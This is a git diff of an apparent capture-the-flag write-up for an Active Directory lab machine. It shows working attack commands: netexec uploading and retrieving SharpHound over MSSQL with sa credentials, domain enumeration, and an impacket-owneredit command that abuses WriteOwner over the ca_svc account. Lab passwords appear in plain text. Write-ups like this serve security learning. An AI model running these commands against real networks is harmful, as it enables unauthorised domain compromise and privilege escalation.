@@ -242,7 +242,7 @@ The user flag was in `ryan`'s Desktop
 
 ### Domain Analysis
 
-I used the remote shell to upload the BloodHound data collection tool "SharpHound" to identify privilege escalation paths:
+I used the remote shell to upload the BloodHound data collection tool "SharpHound"
 ```powershell
 nxc mssql 'DC01' -u 'sa'  -p 'MSSQLP@ssw0rd!' --local-auth --put-file SharpHound.exe 'C:\Users\Public\SharpHound.exe'
 
@@ -252,7 +252,7 @@ MSSQL       10.10.11.51     1433   DC01             [*] Size is 1286656 bytes
 MSSQL       10.10.11.51     1433   DC01             [+] File has been uploaded on the remote machine
 ```
 
-I downloaded trh
+And ran it to collect all data on the domain, to a file called `loot.zip`.
 ```powershell
 pwd
 C:\users\public
@@ -260,7 +260,7 @@ C:\users\public
 .\SharpHound.exe -c all --zipfilename loot.zip
 ```
 
-Download the loot
+I download the loot, and uploaded it to `BloodHound-CE.`
 ```powershell
 nxc mssql 'DC01' -u 'sa'  -p 'MSSQLP@ssw0rd!' --local-auth --get-file 'C:\Users\Public\20250615120137_loot.zip' loot.zip
 
@@ -270,12 +270,14 @@ nxc mssql 'DC01' -u 'sa'  -p 'MSSQLP@ssw0rd!' --local-auth --get-file 'C:\Users\
 
 ### WriteOwner Permission Abuse
 
-BloodHound analysis revealed `ryan` possessed `WriteOwner` permissions over `ca_svc`, a certificate services account:
+BloodHound analysis via the "Outbound Object Control" attribute, revealed that `ryan` possessed `WriteOwner` permissions over `ca_svc`, a certificate services account:
 
 ![[Pasted image 20250615203243.png]]
 
 This account is a member of the "Cert Publishers" group, 
 ![[Pasted image 20250615203401.png]]
+
+
 ```powershell
 impacket-owneredit -action write -new-owner ryan -target ca_svc 10.10.11.51/ryan:WqSZAF6CysDQbGb3   
 Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
